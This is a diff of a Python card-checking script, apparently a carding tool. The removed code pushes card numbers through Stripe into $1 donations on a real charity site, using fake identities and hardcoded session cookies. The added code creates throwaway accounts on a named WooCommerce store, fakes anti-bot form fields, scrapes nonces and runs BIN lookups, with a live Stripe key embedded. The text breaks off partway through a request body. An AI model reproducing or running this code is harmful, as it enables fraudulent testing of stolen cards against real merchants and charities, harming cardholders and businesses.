@@ -1,417 +1,453 @@
 import requests
-import random
-import json
 import re
-from datetime import datetime
+import json
 import time
-from typing import Dict, Tuple, Optional, Any
-from flask import Flask, request, jsonify, Response
+import random
+import string
+from urllib3.exceptions import InsecureRequestWarning
+from urllib3 import disable_warnings
+from datetime import datetime
+from typing import Dict, Tuple, Optional, List
 import threading
-import queue
 
-app = Flask(__name__)
+# Disable SSL warnings
+disable_warnings(InsecureRequestWarning)
 
-class StripeChargeAPI:
+class StripeAuthAPI:
     def __init__(self):
-        self.state_abbreviations = {
-            'alabama': 'AL', 'alaska': 'AK', 'arizona': 'AZ', 'arkansas': 'AR',
-            'california': 'CA', 'colorado': 'CO', 'connecticut': 'CT', 'delaware': 'DE',
-            'florida': 'FL', 'georgia': 'GA', 'hawaii': 'HI', 'idaho': 'ID',
-            'illinois': 'IL', 'indiana': 'IN', 'iowa': 'IA', 'kansas': 'KS',
-            'kentucky': 'KY', 'louisiana': 'LA', 'maine': 'ME', 'maryland': 'MD',
-            'massachusetts': 'MA', 'michigan': 'MI', 'minnesota': 'MN', 'mississippi': 'MS',
-            'missouri': 'MO', 'montana': 'MT', 'nebraska': 'NE', 'nevada': 'NV',
-            'new hampshire': 'NH', 'new jersey': 'NJ', 'new mexico': 'NM', 'new york': 'NY',
-            'north carolina': 'NC', 'north dakota': 'ND', 'ohio': 'OH', 'oklahoma': 'OK',
-            'oregon': 'OR', 'pennsylvania': 'PA', 'rhode island': 'RI', 'south carolina': 'SC',
-            'south dakota': 'SD', 'tennessee': 'TN', 'texas': 'TX', 'utah': 'UT',
-            'vermont': 'VT', 'virginia': 'VA', 'washington': 'WA', 'west virginia': 'WV',
-            'wisconsin': 'WI', 'wyoming': 'WY',
-            'district of columbia': 'DC', 'guam': 'GU', 'american samoa': 'AS',
-            'northern mariana islands': 'MP', 'puerto rico': 'PR', 'virgin islands': 'VI'
-        }
-        
-        self.email_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
-        
-    def get_state_abbreviation(self, state_name: str) -> str:
-        """Convert state name to abbreviation"""
-        return self.state_abbreviations.get(state_name.lower(), 'NY')
+        self.session = requests.Session()
+        self.base_url = "https://iconichairproducts.com"
+        self.stripe_key = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
+        self.account_created = False
+        self.cookies_initialized = False
+        self.nonce_cache = {}
+        self.lock = threading.Lock()
+        self.setup_headers()
     
-    def parse_card_input(self, card_input: str) -> Dict:
-        """Parse card input in various formats"""
-        # Remove any spaces
-        card_input = card_input.strip()
+    def setup_headers(self):
+        """Setup default headers for the session"""
+        self.headers = {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+        }
+        self.session.headers.update(self.headers)
+    
+    def initialize_cookies(self):
+        """Initialize cookies by visiting the my-account page"""
+        try:
+            response = self.session.get(
+                f"{self.base_url}/my-account/", 
+                timeout=30, 
+                verify=False,
+                allow_redirects=True
+            )
+            response.raise_for_status()
+            self.cookies_initialized = True
+            return True
+        except Exception as e:
+            print(f"Failed to initialize cookies: {e}")
+            return False
+    
+    def extract_register_nonce(self, html_content):
+        """Extract woocommerce-register-nonce from HTML"""
+        pattern = r'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([a-f0-9]+)"'
+        match = re.search(pattern, html_content)
+        return match.group(1) if match else None
+    
+    def extract_wp_referer(self, html_content):
+        """Extract _wp_http_referer from HTML"""
+        pattern = r'name="_wp_http_referer" value="([^"]+)"'
+        match = re.search(pattern, html_content)
+        return match.group(1) if match else "/my-account/"
+    
+    def is_logged_in(self, html_content):
+        """Check if registration was successful by looking for MyAccount navigation"""
+        patterns = [
+            r'woocommerce-MyAccount-navigation-link--dashboard',
+            r'woocommerce-MyAccount-navigation-link--orders',
+            r'woocommerce-MyAccount-navigation-link--payment-methods'
+        ]
+        return any(re.search(pattern, html_content) for pattern in patterns)
+    
+    def get_random_email(self):
+        """Generate a random email"""
+        import random
+        import string
+        
+        # Generate random username
+        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+        
+        # Random domain
+        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
+        domain = random.choice(domains)
+        
+        return f"{username}@{domain}"
+    
+    def register_account(self):
+        """Register a new account"""
+        try:
+            # Initialize cookies if not done already
+            if not self.cookies_initialized:
+                if not self.initialize_cookies():
+                    return False
+            
+            # Generate random credentials
+            email = self.get_random_email()
+            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+            
+            # Step 1: Get the registration page to extract nonce
+            response = self.session.get(
+                f"{self.base_url}/my-account/", 
+                timeout=30, 
+                verify=False
+            )
+            response.raise_for_status()
+            
+            # Extract nonce and referer
+            nonce = self.extract_register_nonce(response.text)
+            wp_referer = self.extract_wp_referer(response.text)
+            
+            if not nonce:
+                print("Failed to extract nonce")
+                return False
+            
+            # Step 2: Register the account
+            registration_data = {
+                'email': email,
+                'wc_order_attribution_source_type': 'typein',
+                'wc_order_attribution_referrer': 'https://iconichairproducts.com/my-account/payment-methods/',
+                'wc_order_attribution_utm_campaign': '(none)',
+                'wc_order_attribution_utm_source': '(direct)',
+                'wc_order_attribution_utm_medium': '(none)',
+                'wc_order_attribution_utm_content': '(none)',
+                'wc_order_attribution_utm_id': '(none)',
+                'wc_order_attribution_utm_term': '(none)',
+                'wc_order_attribution_utm_source_platform': '(none)',
+                'wc_order_attribution_utm_creative_format': '(none)',
+                'wc_order_attribution_utm_marketing_tactic': '(none)',
+                'wc_order_attribution_session_entry': 'https://iconichairproducts.com/my-account/add-payment-method/',
+                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'wc_order_attribution_session_pages': '5',
+                'wc_order_attribution_session_count': '1',
+                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+                'woocommerce-register-nonce': nonce,
+                '_wp_http_referer': wp_referer,
+                'register': 'Register',
+            }
+            
+            # Add additional form fields
+            timestamp = int(time.time() * 1000)
+            registration_data.update({
+                'ak_bib': str(timestamp),
+                'ak_bfs': str(timestamp + 6202),
+                'ak_bkpc': '1',
+                'ak_bkp': '3;',
+                'ak_bmc': '3;3,7226;',
+                'ak_bmcc': '2',
+                'ak_bmk': '',
+                'ak_bck': '',
+                'ak_bmmc': '1',
+                'ak_btmc': '2',
+                'ak_bsc': '3',
+                'ak_bte': '283;67,282;203,1497;22,5504;',
+                'ak_btec': '4',
+                'ak_bmm': '15,335;',
+            })
+            
+            response = self.session.post(
+                f"{self.base_url}/my-account/",
+                data=registration_data,
+                timeout=30,
+                verify=False,
+                allow_redirects=True
+            )
+            response.raise_for_status()
+            
+            # Check if registration was successful
+            if self.is_logged_in(response.text):
+                self.account_created = True
+                print(f"Account created successfully! Email: {email}")
+                return True
+            else:
+                print("Registration failed - not logged in")
+                return False
+                
+        except Exception as e:
+            print(f"Registration error: {e}")
+            return False
+    
+    def extract_nonce_multiple_methods(self, html_content):
+        """Extract nonce using multiple methods"""
+        methods = [
+            self._extract_via_direct_pattern,
+            self._extract_via_stripe_params,
+            self._extract_via_json_script,
+            self._extract_via_fallback_pattern
+        ]
+        
+        for method in methods:
+            nonce = method(html_content)
+            if nonce:
+                return nonce
+        return None
+    
+    def _extract_via_direct_pattern(self, html):
+        pattern = r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"'
+        match = re.search(pattern, html)
+        return match.group(1) if match else None
+    
+    def _extract_via_stripe_params(self, html):
+        pattern = r'var\s+wc_stripe_params\s*=\s*({[^}]+})'
+        match = re.search(pattern, html)
+        if match:
+            try:
+                json_str = match.group(1)
+                json_str = re.sub(r',\s*}', '}', json_str)
+                data = json.loads(json_str)
+                return data.get('createAndConfirmSetupIntentNonce')
+            except:
+                pass
+        return None
+    
+    def _extract_via_json_script(self, html):
+        script_pattern = r'<script[^>]*>(.*?)</script>'
+        scripts = re.findall(script_pattern, html, re.DOTALL)
+        
+        for script in scripts:
+            if 'createAndConfirmSetupIntentNonce' in script:
+                json_pattern = r'\{[^}]*(?:createAndConfirmSetupIntentNonce[^}]*)+[^}]*\}'
+                json_matches = re.findall(json_pattern, script)
+                for json_str in json_matches:
+                    try:
+                        clean_json = json_str.replace("'", '"')
+                        data = json.loads(clean_json)
+                        if 'createAndConfirmSetupIntentNonce' in data:
+                            return data['createAndConfirmSetupIntentNonce']
+                    except:
+                        continue
+        return None
+    
+    def _extract_via_fallback_pattern(self, html):
+        patterns = [
+            r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
+            r'createAndConfirmSetupIntentNonce\s*=\s*["\']([a-f0-9]{10})["\']',
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                return match.group(1)
+        return None
+    
+    def get_ajax_nonce(self):
+        """Get AJAX nonce from add-payment-method page"""
+        try:
+            response = self.session.get(
+                f"{self.base_url}/my-account/add-payment-method/",
+                timeout=30,
+                verify=False
+            )
+            response.raise_for_status()
+            
+            nonce = self.extract_nonce_multiple_methods(response.text)
+            return nonce
+                
+        except Exception as e:
+            print(f"Failed to extract AJAX nonce: {e}")
+            return None
+    
+    def parse_card(self, card_string: str) -> Dict:
+        """Parse card string in various formats"""
+        # Remove any whitespace
+        card_string = card_string.strip()
         
         # Handle different separators
-        if '|' in card_input:
-            parts = card_input.split('|')
-        elif '/' in card_input:
-            parts = card_input.split('/')
-        elif ';' in card_input:
-            parts = card_input.split(';')
-        elif ':' in card_input:
-            parts = card_input.split(':')
+        if '|' in card_string:
+            parts = card_string.split('|')
+        elif '/' in card_string:
+            parts = card_string.split('/')
         else:
-            # Try to parse as space separated
-            parts = card_input.split()
+            raise ValueError("Invalid card format")
         
-        if len(parts) < 4:
-            raise ValueError("Invalid card format. Use: ccn|mm|yy|cvv")
+        # Clean each part
+        parts = [p.strip() for p in parts]
         
-        ccn = parts[0].strip()
-        mm = parts[1].strip()
-        yy = parts[2].strip()
-        cvv = parts[3].strip()
+        # Extract card number (remove spaces)
+        ccn = parts[0].replace(' ', '')
         
-        # Clean card number
-        ccn = re.sub(r'\D', '', ccn)
+        # Extract month
+        mm = parts[1]
+        if len(mm) == 1:
+            mm = f"0{mm}"
+        
+        # Extract year and CVV
+        if len(parts) == 3:
+            # Format: ccn|mm/yy|cvv or ccn|mm/yyyy|cvv
+            year_part = parts[2]
+            cvv = parts[3] if len(parts) > 3 else ''
+        else:
+            # Format: ccn|mm|yy|cvv
+            year_part = parts[2]
+            cvv = parts[3] if len(parts) > 3 else ''
         
         # Handle year format
-        if len(yy) == 4:
-            yy = yy[2:]  # Convert YYYY to YY
-        elif len(yy) != 2:
-            raise ValueError("Invalid year format. Use YY or YYYY")
+        if len(year_part) == 2:
+            yy = year_part
+            yyyy = f"20{year_part}"
+        elif len(year_part) == 4:
+            yy = year_part[2:]
+            yyyy = year_part
+        else:
+            raise ValueError("Invalid year format")
         
         return {
             'ccn': ccn,
-            'mm': mm.zfill(2),
+            'mm': mm,
             'yy': yy,
+            'yyyy': yyyy,
             'cvv': cvv
         }
     
-    def bin_lookup(self, ccn: str) -> Dict:
-        """Lookup BIN information"""
-        try:
-            # Extract first 6 digits
-            bin_number = ccn[:6]
-            url = f"https://bins.antipublic.cc/bins/{bin_number}"
-            
-            response = requests.get(url, timeout=10)
-            
-            if response.status_code == 200:
-                bin_data = response.json()
-                return {
-                    'bin': bin_data.get('bin', bin_number),
-                    'brand': bin_data.get('brand', 'UNKNOWN'),
-                    'country': bin_data.get('country', 'UNKNOWN'),
-                    'country_name': bin_data.get('country_name', 'UNKNOWN'),
-                    'country_flag': bin_data.get('country_flag', '🏳️'),
-                    'bank': bin_data.get('bank', 'UNKNOWN'),
-                    'level': bin_data.get('level', 'UNKNOWN'),
-                    'type': bin_data.get('type', 'UNKNOWN')
-                }
-            else:
-                return {
-                    'bin': bin_number,
-                    'brand': 'UNKNOWN',
-                    'country': 'UNKNOWN',
-                    'country_name': 'UNKNOWN',
-                    'country_flag': '🏳️',
-                    'bank': 'UNKNOWN',
-                    'level': 'UNKNOWN',
-                    'type': 'UNKNOWN',
-                    'error': 'BIN lookup failed'
-                }
-        except Exception as e:
-            return {
-                'bin': ccn[:6] if len(ccn) >= 6 else 'UNKNOWN',
-                'brand': 'UNKNOWN',
-                'country': 'UNKNOWN',
-                'country_name': 'UNKNOWN',
-                'country_flag': '🏳️',
-                'bank': 'UNKNOWN',
-                'level': 'UNKNOWN',
-                'type': 'UNKNOWN',
-                'error': str(e)
-            }
+    def format_scheme(self, scheme):
+        """Format card scheme name"""
+        scheme = scheme.lower().strip()
+        
+        mapping = {
+            'visa': 'VISA',
+            'mastercard': 'MasterCard',
+            'mc': 'MasterCard',
+            'master card': 'MasterCard',
+            'amex': 'American Express',
+            'american express': 'American Express',
+            'americanexpress': 'American Express',
+            'discover': 'Discover',
+            'jcb': 'JCB',
+            'diners': 'Diners Club',
+            'diners club': 'Diners Club',
+            'unionpay': 'UnionPay',
+            'union pay': 'UnionPay',
+            'maestro': 'Maestro',
+            'elo': 'Elo',
+            'hiper': 'Hiper',
+            'hipercard': 'Hipercard'
+        }
+        
+        return mapping.get(scheme, scheme.capitalize())
     
-    def get_random_user_info(self) -> Dict:
-        """Fetch random user info from API"""
+    def get_bin_info(self, bin):
+        """Get BIN information from multiple sources"""
+        bin = str(bin)[:6]
+        
+        # Try antipublic first
+        result = self.get_bin_info_from_antipublic(bin)
+        if result['country'] != 'Unknown' and result['bank'] != 'Unknown':
+            return result
+        
+        # Try bincheck
+        result = self.get_bin_info_from_bincheck(bin)
+        if result['country'] != 'Unknown' and result['bank'] != 'Unknown':
+            return result
+        
+        # Try binlist as fallback
+        result = self.get_bin_info_from_binlist(bin)
+        return result
+    
+    def get_bin_info_from_binlist(self, bin):
+        """Get BIN info from binlist.net"""
+        headers = {
+            'Accept': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
+        }
+        
         try:
-            response = requests.get('https://randomuser.me/api/?nat=us', timeout=10)
+            response = requests.get(f"https://lookup.binlist.net/{bin}", headers=headers, timeout=5, verify=False)
+            if response.status_code != 200:
+                return {'country': 'Unknown', 'bank': 'Unknown'}
+            
             data = response.json()
-            user = data['results'][0]
-            
-            # Format email with random domain
-            first_name = user['name']['first'].lower()
-            last_name = user['name']['last'].lower()
-            domain = random.choice(self.email_domains)
-            email = f"{first_name}.{last_name}@{domain}"
-            
-            # Format phone number (remove non-digits)
-            phone = re.sub(r'\D', '', user['phone'])
-            if len(phone) == 10:
-                phone = f"{phone[:3]}{phone[3:6]}{phone[6:]}"
-            
-            # Get state abbreviation
-            state_name = user['location']['state'].lower()
-            state_abbr = self.state_abbreviations.get(state_name, 'NY')
+            scheme = data.get('scheme', 'Unknown')
+            bank = data.get('bank', {}).get('name', 'Unknown')
+            country = data.get('country', {}).get('name', 'Unknown')
             
             return {
-                'member_first_name': user['name']['first'],
-                'member_last_name': user['name']['last'],
-                'billing_first_name': user['name']['first'],
-                'billing_last_name': user['name']['last'],
-                'member_name': f"{user['name']['first']} {user['name']['last']}",
-                'billing_address1': f"{user['location']['street']['number']} {user['location']['street']['name']}",
-                'billing_city': user['location']['city'],
-                'billing_state': state_abbr,
-                'billing_postal_code': str(user['location']['postcode']),
-                'billing_country': 'US',
-                'member_email_address': email,
-                'member_phone': phone,
-                'nat': user['nat']
+                'scheme': self.format_scheme(scheme),
+                'bank': bank,
+                'country': country
             }
             
-        except Exception as e:
-            # Return default info if API fails
-            return self.get_default_user_info()
+        except:
+            return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
     
-    def get_default_user_info(self) -> Dict:
-        """Provide default user info if API fails"""
-        return {
-            'member_first_name': 'David',
-            'member_last_name': 'Aloysius',
-            'billing_first_name': 'David',
-            'billing_last_name': 'Aloysius',
-            'member_name': 'David Aloysius',
-            'billing_address1': 'Mall Rd, Library Msll Rd',
-            'billing_city': 'New York',
-            'billing_state': 'NY',
-            'billing_postal_code': '10080',
-            'billing_country': 'US',
-            'member_email_address': 'thebrokenfuxker@gmail.com',
-            'member_phone': '9042252059',
-            'nat': 'US'
-        }
-    
-    def create_stripe_source(self, card_info: Dict, user_info: Dict) -> Optional[Dict]:
-        """Create Stripe source with card details"""
+    def get_bin_info_from_bincheck(self, bin):
+        """Get BIN info from bincheck.io"""
         headers = {
-            'accept': 'application/json',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'priority': 'u=1, i',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+            'Referer': f'https://bincheck.io/details/{bin}',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v"138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
         }
-        
-        # Generate unique IDs for Stripe
-        guid = f"{random.getrandbits(128):032x}"
-        muid = f"{random.getrandbits(128):032x}"
-        sid = f"{random.getrandbits(128):032x}"
-        
-        data = {
-            'referrer': 'https%3A%2F%2Fdonate.wck.org',
-            'type': 'card',
-            'card[number]': card_info['ccn'],
-            'card[cvc]': card_info['cvv'],
-            'card[exp_month]': card_info['mm'],
-            'card[exp_year]': card_info['yy'],
-            'guid': guid,
-            'muid': muid,
-            'sid': sid,
-            'payment_user_agent': 'stripe.js%2F9390d43c1d%3B+stripe-js-v3%2F9390d43c1d%3B+card-element',
-            'time_on_page': str(random.randint(100000, 200000)),
-            'client_attribution_metadata[client_session_id]': f"{random.getrandbits(128):032x}",
-            'client_attribution_metadata[merchant_integration_source]': 'elements',
-            'client_attribution_metadata[merchant_integration_subtype]': 'card',
-            'client_attribution_metadata[merchant_integration_version]': '2017',
-            'key': 'pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz'
-        }
-        
-        # Convert dict to form-urlencoded string
-        data_str = '&'.join([f"{k}={v}" for k, v in data.items()])
         
         try:
-            response = requests.post(
-                'https://api.stripe.com/v1/sources',
-                headers=headers,
-                data=data_str,
-                timeout=30
-            )
+            response = requests.get(f"https://bincheck.io/details/{bin}", headers=headers, timeout=5, verify=False)
+            if response.status_code != 200:
+                return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
             
-            if response.status_code == 200:
-                return response.json()
-            else:
-                return None
-                
-        except Exception as e:
-            return None
+            html = response.text
+            
+            # Extract scheme
+            scheme_match = re.search(r'<td[^>]*>Card Brand</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
+            scheme = scheme_match.group(1) if scheme_match else 'Unknown'
+            
+            # Extract bank
+            bank_match = re.search(r'<td[^>]*>Bank</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
+            bank = bank_match.group(1) if bank_match else 'Unknown'
+            
+            # Extract country
+            country_match = re.search(r'<td[^>]*>Country</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
+            country = country_match.group(1) if country_match else 'Unknown'
+            
+            return {
+                'scheme': self.format_scheme(scheme),
+                'bank': bank.strip(),
+                'country': country.strip()
+            }
+            
+        except:
+            return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
     
-    def make_donation(self, stripe_source: Dict, user_info: Dict) -> requests.Response:
-        """Make donation with Stripe source"""
-        cookies = {
-            'connect.sid': 's%3AjgaYr-ih0CCISD0HY6tHLgh1CLRTi2_n.Mwlls%2B43ueFQnoL8gTPiC25aNdpXOsmUSQCZ9VhN2s0',
-            '__cfruid': '9e005834067899db9255bd89206c1ed78a0a36da-1765206334',
-            'optimizelyEndUserId': 'oeu1765206337003r0.6503555141435973',
-            'classy-session-id': '7a9ebe12-1cd1-4935-bb74-c7ed902d33fe',
-            'pgdid': 'SD34PTQFqiwTr-_UBulOi',
-            '__cf_bm': 'Ra_zB_yFnU27PTwhoSILrkAExqjbhhREDepg_8CiX_A-1765206339-1.0.1.1-gV6Co3MkM8T4bkRsTeV9YM7BcJ1v.ABp5OGkHZC1w29MbvlYo2gw3O1dU87R4_69nsyPNza41hDFutciuyub7HyJeMl6AA5oJA_Nmx50mfI',
-            '_cfuvid': 'W6.rGa0wKhaYEiIYxAkVIsSlQR_IyaMvvJxo8ZQhEwc-1765206339637-0.0.1.1-604800000',
-            'CSRF-TOKEN': 'ui4fObkI-G2DC2K_e0ZAJ9BVOgFu2KCq7sAQ',
-            'XSRF-TOKEN': 'eyJpdiI6ImdEanc1UUs2Q2NNL01rNW1pMU1vamc9PSIsInZhbHVlIjoicjVJYlpheXcyMG42UDIzbXBWRjZBK2JPQTdnVGVlSHFuUGtpaFVwUldZcElsZDE5a1FRMFJ1b216NFNxRHkvQVV2OE5UY1FTaXlDaktjV0FCYlYzaHYzZWhmU0kxK2JBaVF5RFRSeVRNa3pLRnJVWllSZkNxa0JReVIvTk5MQlQiLCJtYWMiOiJiNDI2YWM3MzA3ZmNmOWI5NDQxZWQzMzhmYTRhNGRmYjVjNDRkYzJkMjBlNjkzMjMwNDA0ZmI0OTNmNjNmYWQyIiwidGFnIjoiIn0%3D',
-            'sid': 'eyJpdiI6IkM1Y2wwK1RjZHNneVgvdVdKdzcxSHc9PSIsInZhbHVlIjoiV0M4eEpzaEhDMGtzeENXWG5BZWlROWJ5cGQyemJFU2F1WGlWMkZyS1BDd1RFSm40clRrVDZUODFKSkl1RWxWdndUaTJnb1AyZEdQNGlRZ0N2UVlGc0lJQnpWK3psZ2ljY1hvN3pLeHJ5aS92Z25Ga0xqZjBZWWlvTU1DdncwYjMiLCJtYWMiOiI5MDI5OTAyNzQ0ZDVmZDRkZDliOWRmOTA0NjQ5MWVjMGU5MGY0NGI3MjlkNTVhZGFmNzdmZDZkOGMwMDY0YjVmIiwidGFnIjoiIn0%3D',
-            '_hp2_id.1566116007': '%7B%22userId%22%3A%225405055390403450%22%2C%22pageviewId%22%3A%223390023110109351%22%2C%22sessionId%22%3A%22628966895086684%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
-            '_fbp': 'fb.1.1765206345238.2468081888445908',
-            '_hp2_ses_props.1566116007': '%7B%22r%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22ts%22%3A1765206344446%2C%22d%22%3A%22donate.wck.org%22%2C%22h%22%3A%22%2Fgive%2F312884%2F%22%2C%22g%22%3A%22%23!%2Fdonation%2Fcheckout%22%7D',
-            '_tt_enable_cookie': '1',
-            '_ttp': '01KBZ7YRC91VK631QG80R61Y4H_.tt.1',
-            '_hjSessionUser_3399662': 'eyJpZCI6IjQyMTgwMTMzLTBkMmQtNTE1NC1iNzFjLWY3NTNlYmYyNDg2MCIsImNyZWF0ZWQiOjE3NjUyMDYzNTI1MTUsImV4aXN0aW5nIjpmYWxzZX0=',
-            '_hjSession_3399662': 'eyJpZCI6ImFlYzQ0ZDdjLTI1MTItNDE0ZC05MzA5LTBlNDBjYTJjODkwYyIsImMiOjE3NjUyMDYzNTI1MjEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
-            '_uetsid': '62e65420d44711f094ae49dd11c50b71|1h6dnev|2|g1o|0|2168',
-            '_uetvid': '62e8f580d44711f09755f31d1568fce9|3lww3o|1765206353939|1|1|bat.bing.com/p/insights/c/y',
-            '__stripe_mid': 'e88f497a-b85f-493a-8df3-90477c6b0fc9131bc4',
-            '__stripe_sid': '81febf72-78e9-4e1b-b892-8d92785f2b704bcf66',
-            'optimizelySession': '1765206365974',
-            '_ga_5WKVY8503C': 'GS2.1.s1765206348$o1$g1$t1765206367$j41$l0$h0',
-            'OptanonAlertBoxClosed': '2025-12-08T15:06:57.926Z',
-            'OptanonConsent': 'isGpcEnabled=0&datestamp=Mon+Dec+08+2025+21%3A06%3A57+GMT%2B0600+(Bangladesh+Standard+Time)&version=6.32.0&isIABGlobal=false&hosts=&consentId=65875c37-7339-4750-92dd-a228db48534e&interactionCount=1&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0002%3A1%2CC0004%3A1',
-            '_ga': 'GA1.2.1018295782.1765206349',
-            '_gid': 'GA1.2.144202828.1765206419',
-            'pjs_user_entered_custom_amount': 'yes',
-            'pjs_manual_ach_donation': 'no',
-            'ttcsid': '1765206352287::AqIg176ZPuXLDPehUGbG.1.1765206467101.0',
-            'ttcsid_CSVQ22BC77UB52N3CER0': '1765206417809::OZSh3A8E4lsQeWy-6ZQD.1.1765206467102.0',
-            '_gcl_au': '1.1.959331015.1765206349.1694289526.1765206363.1765206468',
-        }
-        
+    def get_bin_info_from_antipublic(self, bin):
+        """Get BIN info from antipublic.cc"""
         headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
-            'content-type': 'application/json;charset=UTF-8',
-            'origin': 'https://donate.wck.org',
-            'priority': 'u=1, i',
-            'referer': 'https://donate.wck.org/give/312884/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'traceparent': f'00-{random.getrandbits(128):032x}-{random.getrandbits(64):016x}-01',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
-            'x-xsrf-token': 'ui4fObkI-G2DC2K_e0ZAJ9BVOgFu2KCq7sAQ',
+            'Accept': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
         }
         
-        json_data = {
-            'payment': {
-                'raw_currency_code': 'USD',
-                'paypal': {'status': 'inactive'},
-                'paypal_commerce': {'status': 'ready'},
-                'venmo': {'status': 'ready'},
-                'ach': {'status': 'ready'},
-                'stripe': {
-                    'status': 'ready',
-                    'source': {
-                        'id': stripe_source['id'],
-                        'object': 'source',
-                        'allow_redisplay': 'unspecified',
-                        'amount': None,
-                        'card': {
-                            'address_line1_check': None,
-                            'address_zip_check': None,
-                            'brand': stripe_source['card']['brand'],
-                            'country': 'US',
-                            'cvc_check': 'unchecked',
-                            'dynamic_last4': None,
-                            'exp_month': stripe_source['card']['exp_month'],
-                            'exp_year': stripe_source['card']['exp_year'],
-                            'funding': stripe_source['card']['funding'],
-                            'last4': stripe_source['card']['last4'],
-                            'name': None,
-                            'three_d_secure': 'optional',
-                            'tokenization_method': None,
-                        },
-                        'client_secret': stripe_source['client_secret'],
-                        'created': stripe_source['created'],
-                        'currency': None,
-                        'flow': 'none',
-                        'livemode': True,
-                        'owner': {
-                            'address': None,
-                            'email': None,
-                            'name': None,
-                            'phone': None,
-                            'verified_address': None,
-                            'verified_email': None,
-                            'verified_name': None,
-                            'verified_phone': None,
-                        },
-                        'statement_descriptor': None,
-                        'status': 'chargeable',
-                        'type': 'card',
-                        'usage': 'reusable',
-                    },
-                },
-                'cc': {'status': 'inactive'},
-                'creditee_team_id': None,
-                'method': 'Stripe',
-                'gateway': {
-                    'id': '21988',
-                    'name': 'STRIPE',
-                    'status': 'ACTIVE',
-                    'currency': 'USD',
-                },
-            },
-            'frequency': 'one-time',
-            'items': [{
-                'type': 'donation',
-                'product_name': 'Donation',
-                'raw_final_price': 1,
-                'previous_frequency_price': 100,
-            }],
-            'fundraising_page_id': None,
-            'fundraising_team_id': None,
-            'designation_id': 150483,
-            'answers': [],
-            'billing_address1': user_info['billing_address1'],
-            'billing_address2': '',
-            'billing_city': user_info['billing_city'],
-            'billing_state': user_info['billing_state'],
-            'billing_postal_code': user_info['billing_postal_code'],
-            'billing_country': user_info['billing_country'],
-            'comment': 'Get a fwell Dinner!',
-            'member_name': user_info['member_name'],
-            'member_email_address': user_info['member_email_address'],
-            'member_phone': user_info['member_phone'],
-            'is_anonymous': False,
-            'opt_in': True,
-            'opt_in_wording': "It's okay to contact me in the future.",
-            'application_id': '11153',
-            'billing_first_name': user_info['billing_first_name'],
-            'billing_last_name': user_info['billing_last_name'],
-            'fee_on_top': False,
